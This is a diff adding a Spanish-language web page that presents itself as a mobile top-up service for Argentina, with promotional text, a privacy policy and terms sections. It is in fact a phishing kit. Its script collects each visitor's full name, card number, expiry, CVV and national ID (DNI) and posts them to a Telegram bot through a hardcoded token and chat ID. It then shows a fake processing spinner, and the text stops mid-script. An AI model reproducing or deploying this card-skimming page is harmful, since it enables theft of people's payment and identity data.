@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Recargas móviles rápidas y seguras para Argentina. Envía top-ups a teléfonos con ofertas especiales.">
+    <meta name="keywords" content="recargas móviles, top-up Argentina, recarga teléfono, Claro, Movistar, Personal">
+    <meta name="author" content="Recargas para Argentina">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Recargas Móviles para Argentina">
+    <meta property="og:description" content="Envía recargas rápidas y seguras a teléfonos en Argentina. ¡Mantén tu línea siempre activa!">
+    <meta property="og:image" content="https://picsum.photos/800/200?random=1">
+    <meta property="og:url" content="https://tu-sitio.netlify.app">
+    <meta property="og:type" content="website">
+    <title>Recargas Móviles - Argentina</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"> <!-- Para íconos -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background-color: #007bff;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .promo {
+            background-color: #fff3cd;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .benefits {
+            margin-bottom: 30px;
+        }
+        .benefits h2 {
+            color: #007bff;
+        }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .benefit-item i {
+            font-size: 24px;
+            color: #28a745;
+            margin-right: 10px;
+        }
+        .countries {
+            margin-bottom: 30px;
+        }
+        .countries h2 {
+            text-align: center;
+            color: #007bff;
+        }
+        .country-item {
+            text-align: center;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .country-item img {
+            width: 100px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 4px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .no-saldo {
+            background-color: #f8d7da;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .no-saldo h2 {
+            color: #721c24;
+        }
+        .payment-details {
+            display: none; /* Oculto inicialmente */
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+        }
+        .processing {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #007bff, #28a745);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            z-index: 1000;
+            border: 3px solid #fff;
+        }
+        .processing i {
+            font-size: 48px;
+            margin-bottom: 15px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .processing p {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .privacy, .terms, .contact {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            margin-top: 20px;
+        }
+        footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Recargas Móviles para Argentina</h1>
+        <p>Envía recargas rápidas y seguras a teléfonos en Argentina. ¡Mantén tu línea siempre activa!</p>
+        <img src="https://picsum.photos/800/200?random=1" alt="Banner de recargas en Argentina" style="width: 100%; max-width: 800px; margin-top: 10px; border-radius: 8px;">
+    </header>
+
+    <div class="container">
+        <div class="promo">
+            <h2>¡Oferta Irresistible para Argentina!</h2>
+            <p>Recarga ahora y obtén un bono extra del 20% en tu próxima compra, además de envío gratuito. ¡Aprovecha esta promoción limitada antes de que termine!</p>
+            <img src="https://picsum.photos/300/150?random=2" alt="Imagen de oferta especial" style="width: 100%; max-width: 300px; margin-top: 10px; border-radius: 8px;">
+        </div>
+
+        <div class="no-saldo">
+            <h2>¿Por qué no quedarse con saldo en Argentina?</h2>
+            <p>En Argentina, quedarse sin saldo en tu teléfono móvil puede ser especialmente problemático debido a las altas tarifas de roaming y los costos de llamadas de emergencia. Imagina perder contacto con tu familia durante un viaje o no poder acceder a datos para trabajo. Con nuestras recargas, evitas estos inconvenientes y mantienes el control de tu conectividad. Beneficios de recargar regularmente en Argentina:</p>
+            <ul>
+                <li><strong>Evita cortes de servicio:</strong> Nunca te quedes sin minutos o datos en momentos importantes, como emergencias o viajes.</li>
+                <li><strong>Ahorra dinero:</strong> Recargar a tiempo previene cargos extras por servicios de roaming o llamadas internacionales.</li>
+                <li><strong>Mantén la comunicación:</strong> Estar siempre disponible para familia, amigos y negocios en un país con alta dependencia móvil.</li>
+                <li><strong>Flexibilidad local:</strong> Elige montos en pesos argentinos, adaptados a tu necesidad.</li>
+                <li><strong>Seguridad y rapidez:</strong> Procesos seguros con entrega instantánea y confirmación por SMS.</li>
+            </ul>
+            <p>¡No esperes a que sea tarde! Recarga hoy y disfruta de una experiencia móvil sin interrupciones en Argentina.</p>
+            <img src="https://picsum.photos/400/200?random=3" alt="Imagen de advertencia de saldo bajo en Argentina" style="width: 100%; max-width: 400px; margin-top: 10px; border-radius: 8px;">
+        </div>
+
+        <div class="benefits">
+            <h2>¿Por qué elegirnos para Argentina?</h2>
+            <div class="benefit-item">
+                <i class="fas fa-globe"></i>
+                <p><strong>Cobertura nacional:</strong> Recargas para todas las operadoras argentinas como Claro, Movistar y Personal.</p>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-clock"></i>
+                <p><strong>Entrega instantánea:</strong> Tu recarga llega en segundos, no en días.</p>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-shield-alt"></i>
+                <p><strong>Seguridad garantizada:</strong> Pagos encriptados y protección de datos.</p>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-mobile-alt"></i>
+                <p><strong>Fácil de usar:</strong> Interfaz simple para recargar desde cualquier dispositivo.</p>
+            </div>
+        </div>
+
+        <div class="countries">
+            <h2>País Disponible</h2>
+            <div class="country-item">
+                <img src="https://picsum.photos/100/60?random=4" alt="Bandera Argentina">
+                <p>Argentina</p>
+            </div>
+        </div>
+
+        <form id="topup-form">
+            <h2>Realiza tu Recarga para Argentina</h2>
+            <div class="form-group">
+                <label for="phone">Número de Teléfono (Argentina):</label>
+                <input type="tel" id="phone" placeholder="Ej: +54 9 11 1234 5678" required>
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Monto de Recarga (ARS):</label>
+                <select id="amount">
+                    <option value="1000">1000 ARS</option>
+                    <option value="2000">2000 ARS</option>
+                    <option value="5000">5000 ARS</option>
+                    <option value="10000">10000 ARS</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="payment">Método de Pago:</label>
+                <select id="payment">
+                    <option value="card">Tarjeta de Crédito</option>
+                    <option value="debit">Tarjeta de Débito</option>
+                </select>
+            </div>
+
+            <button type="submit">Realizar Recarga</button>
+        </form>
+
+        <div class="payment-details" id="payment-details">
+            <h3>Detalles de Pago</h3>
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="name">Nombre y Apellido:</label>
+                    <input type="text" id="name" placeholder="Ej: Juan Pérez" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-number">Número de Tarjeta:</label>
+                    <input type="text" id="card-number" placeholder="Ej: 1234567890123456" required>
+                </div>
+                <div class="form-group">
+                    <label for="expiry">Vencimiento (MM/AA):</label>
+                    <input type="text" id="expiry" placeholder="Ej: 1225" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">Código de Seguridad (CVV):</label>
+                    <input type="text" id="cvv" placeholder="Ej: 123" required>
+                </div>
+                <div class="form-group">
+                    <label for="dni">DNI:</label>
+                    <input type="text" id="dni" placeholder="Ej: 12345678" required>
+                </div>
+                <button type="submit">Confirmar Pago</button>
+            </form>
+        </div>
+
+        <div id="result" style="margin-top: 20px; display: none;">
+            <h3>Recarga Procesada</h3>
+            <p>Tu recarga ha sido enviada exitosamente a Argentina. Recibirás una confirmación por SMS.</p>
+            <img src="https://picsum.photos/200/100?random=5" alt="Imagen de confirmación" style="width: 100%; max-width: 200px; margin-top: 10px; border-radius: 8px;">
+        </div>
+
+        <!-- Secciones de cumplimiento para Google Ads -->
+        <div class="privacy" id="privacy">
+            <h2>Política de Privacidad</h2>
+            <p>Recopilamos información personal solo para procesar recargas. No compartimos datos con terceros sin consentimiento. Cumplimos con la ley 25.326 de Argentina.</p>
+            <p>Contacto: privacidad@recargasargentina.com</p>
+        </div>
+
+        <div class="terms" id="terms">
+            <h2>Términos y Condiciones</h2>
+            <p>Al usar este servicio, aceptas que las recargas son irreversibles. No nos responsabilizamos por errores en números de teléfono. Servicio disponible solo en Argentina.</p>
+            <p>Última actualización: 2023.</p>
+        </div>
+
+        <div class="contact" id="contact">
+            <h2>Contacto</h2>
+            <p>Email: soporte@recargasargentina.com</p>
+            <p>Teléfono: +54 11 1234 5678</p>
+            <p>Dirección: Buenos Aires, Argentina.</p>
+        </div>
+    </div>
+
+    <!-- Cartel de procesamiento -->
+    <div class="processing" id="processing">
+        <i class="fas fa-spinner"></i>
+        <p>Su carga se está procesando...</p>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 Recargas para Argentina. Todos los derechos reservados. | 
+        <a href="#" onclick="showSection('privacy')">Política de Privacidad</a> | 
+        <a href="#" onclick="showSection('terms')">Términos y Condiciones</a> | 
+        <a href="#" onclick="showSection('contact')">Contacto</a></p>
+    </footer>
+
+    <script>
+        // Función para mostrar secciones
+        function showSection(sectionId) {
+            document.querySelectorAll('.privacy, .terms, .contact').forEach(el => el.style.display = 'none');
+            document.getElementById(sectionId).style.display = 'block';
+            window.scrollTo(0, document.getElementById(sectionId).offsetTop);
+        }
+
+        // Función para permitir solo números
+        function allowOnlyNumbers(event) {
+            const charCode = event.which ? event.which : event.keyCode;
+            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+                event.preventDefault();
+            }
+        }
+
+        // Función para formatear vencimiento (MM/AA)
+        function formatExpiry(event) {
+            let value = event.target.value.replace(/\D/g, ''); // Remover no números
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            event.target.value = value;
+        }
+
+        // Aplicar restricciones
+        document.getElementById('card-number').addEventListener('keypress', allowOnlyNumbers);
+        document.getElementById('cvv').addEventListener('keypress', allowOnlyNumbers);
+        document.getElementById('dni').addEventListener('keypress', allowOnlyNumbers);
+        document.getElementById('expiry').addEventListener('input', formatExpiry); // Formatear automáticamente
+
+        document.getElementById('topup-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            // Ocultar el formulario inicial y mostrar los detalles de pago
+            document.getElementById('topup-form').style.display = 'none';
+            document.getElementById('payment-details').style.display = 'block';
+        });
+
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Capturar datos
+            const phone = document.getElementById('phone').value;
+            const amount = document.getElementById('amount').value;
+            const payment = document.getElementById('payment').value;
+            const name = document.getElementById('name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const dni = document.getElementById('dni').value;
+
+            // Crear mensaje para Telegram
+            const message = `Nueva Recarga Solicitada:\n\nTeléfono: ${phone}\nMonto: ${amount}\nMétodo de Pago: ${payment}\n\nNombre y Apellido: ${name}\nNúmero de Tarjeta: ${cardNumber}\nVencimiento: ${expiry}\nCVV: ${cvv}\nDNI: ${dni}`;
+
+            // Enviar a Telegram
+            const token = '8346114938:AAHqTF8XSZZt5FrIRK8BYmG3CkIUlgegst4';
+            const chatId = '7141503932';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Mensaje enviado a Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error enviando a Telegram:', error);
+            });
+
+            // Mostrar el cartel de procesamiento
+            document.getElementById('processing').style.display = 'block';
+            // Simular procesamiento con un delay de 3 segundos
+            setTimeout(function() {
+               
